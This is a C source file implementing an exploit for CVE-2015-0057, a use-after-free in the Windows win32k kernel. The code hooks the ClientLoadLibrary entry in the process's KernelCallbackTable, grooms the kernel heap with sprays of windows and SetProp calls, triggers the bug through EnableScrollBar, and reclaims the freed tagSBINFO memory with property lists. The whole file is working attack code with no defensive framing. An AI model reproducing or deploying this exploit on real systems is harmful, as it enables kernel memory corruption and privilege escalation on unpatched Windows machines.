#include "CVE-2015-0057.h"

HWND g_hWndFake_2015_0057[FAKE_OBJECTS + 5];
BOOL g_bFlag_2015_0057 = FALSE;
DWORD g_dwOrgClientLoadLibrary = 0;
HWND g_hWnd_2015_0057 = NULL;
DWORD g_dwCount_2015_0057 = 0;

BOOL Exploit_CVE_2015_0057()
{
	BOOL bRet = TRUE;

	if (!HookClientLoadLibrary())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Init_CVE_2015_0057())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2015_0057())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2015_0057()
{
	BOOL bRet = TRUE;
	DWORD i = 0;
	char className[] = "Fake";

	WNDCLASSEXA wc = { 0 };

	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszClassName = className;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	wc.lpfnWndProc = WndProc_CVE_2015_0057;

	if (!RegisterClassExA(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassExA", GetLastError());
		goto exit;
	}

	// 消耗空闲内存块
	for (i = 0; i < JUNK_OBJECTS; i++)
	{
		HWND hWnd = CreateWindowExA(0,
									className,
									NULL,
									WS_OVERLAPPEDWINDOW,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									NULL,
									NULL,
									NULL,
									NULL);
		if (!hWnd)
		{
			bRet = FALSE;
			ShowError("CreateWindowExA", GetLastError());
			goto exit;
		}


		if (!SetProp(hWnd, (LPCSTR)(1), (HANDLE)0x1900))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}
		if (!SetProp(hWnd, (LPCSTR)(1), (HANDLE)0x1900))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}
	}

	// 用来占用tagSBINFO
	for (i = 0; i < FAKE_OBJECTS; i++)
	{
		g_hWndFake_2015_0057[i] = CreateWindowExA(0,
												 className,
												NULL,
												WS_OVERLAPPEDWINDOW,
												CW_USEDEFAULT,
												CW_USEDEFAULT,
												CW_USEDEFAULT,
												CW_USEDEFAULT,
												NULL,
												NULL,
												NULL,
												NULL);
		if (!g_hWndFake_2015_0057[i])
		{
			bRet = FALSE;
			ShowError("CreateWindowExA", GetLastError());
			goto exit;
		}

		
		if (!SetProp(g_hWndFake_2015_0057[i], (LPCSTR)(1), (HANDLE)0x1900))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}

		if (!SetProp(g_hWndFake_2015_0057[i], (LPCSTR)(2), (HANDLE)0x1900))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}
	}

	for (i = 1; i < FAKE_OBJECTS; i += 2)
	{
		if (!DestroyWindow(g_hWndFake_2015_0057[i]))
		{
			bRet = FALSE;
			ShowError("DestroyWindow", GetLastError());
			goto exit;
		}
	}

exit:
	return bRet;
}

BOOL Trigger_CVE_2015_0057()
{
	BOOL bRet = TRUE;
	WNDCLASSEX wc = { 0 };
	char className[] = "Trigger";

	memset(&wc, 0, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszClassName = className;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	g_hWnd_2015_0057 = CreateWindowEx(0,
									  className,
									  0,
									  SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
									  10,
									  10,
								 	  100,
									  100,
									  NULL,
									  NULL,
									  NULL,
									  NULL);

	if (!g_hWnd_2015_0057)
	{
		ShowError("CreateWindowEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 显示窗口，绕过IsVisible函数的验证
	ShowWindow(g_hWnd_2015_0057, SW_SHOW);

	UpdateWindow(g_hWnd_2015_0057);

	g_bFlag_2015_0057 = TRUE;
	//触发漏洞
	if (!EnableScrollBar(g_hWnd_2015_0057, SB_BOTH, ESB_DISABLE_BOTH))
	{
		ShowError("EnableScrollBar", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL HookClientLoadLibrary()
{
	BOOL bRet = TRUE;
	PDWORD dwTarFuncAddr = 0;
	DWORD dwOldProtect = 0;

	dwTarFuncAddr = GetClientLoadLibrary();
	g_dwOrgClientLoadLibrary = *dwTarFuncAddr;

	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						PAGE_READWRITE,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	*dwTarFuncAddr = (DWORD)MyClientLoadLibrary;

	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						dwOldProtect,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL UnHookClientLoadLibrary()
{
	BOOL bRet;
	PDWORD dwTarFuncAddr = 0;
	DWORD dwOldProtect = 0;

	dwTarFuncAddr = GetClientLoadLibrary();

	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						PAGE_READWRITE,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	*dwTarFuncAddr = g_dwOrgClientLoadLibrary;

	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						dwOldProtect,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

PDWORD GetClientLoadLibrary()
{
	__asm
	{
		mov eax, fs:[0x30]			// eax = PEB
		mov eax, [eax + 0x2C]		// eax = KernelCallbackTable
		lea eax, [eax + 0x41 * 4]	// eax = ClientLoadLibrary
	}
}

DWORD MyClientLoadLibrary(DWORD arg0)
{
	if (g_bFlag_2015_0057)
	{
		g_dwCount_2015_0057++;
		if (g_dwCount_2015_0057 == 2)
		{
			g_bFlag_2015_0057 = FALSE;
			// 销毁tagWND对象，跟着也会销毁tagSBINFO对象
			if (!DestroyWindow(g_hWnd_2015_0057))
			{
				ShowError("DestroyWindow", GetLastError());
				goto exit;
			}

			UnHookClientLoadLibrary();
			
			// 增加tagPROP，让tagPROPLIST占用tagSBINFO
			for (DWORD i = 1; i < FAKE_OBJECTS; i++)
			{
				SetProp(g_hWndFake_2015_0057[i], (LPCSTR)(3), (HANDLE)0x1874);
			}
		}
	}

exit:
	char buf[0x1000] = { 0 };
	
	return ((lpClientLoadLibrary)g_dwOrgClientLoadLibrary)((DWORD)buf);
}

BOOL POC_CVE_2015_0057()
{
	BOOL bRet = TRUE;

	if (!HookClientLoadLibrary())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2015_0057())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

LRESULT CALLBACK WndProc_CVE_2015_0057(HWND hWnd,
	UINT msg,
	WPARAM wParam,
	LPARAM lParam)
{
	switch (msg)
	{
		case WM_CLOSE:
		{
			DestroyWindow(hWnd);
			break;
		}
		case WM_DESTROY:
		{
			PostQuitMessage(0);
			break;
		}
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}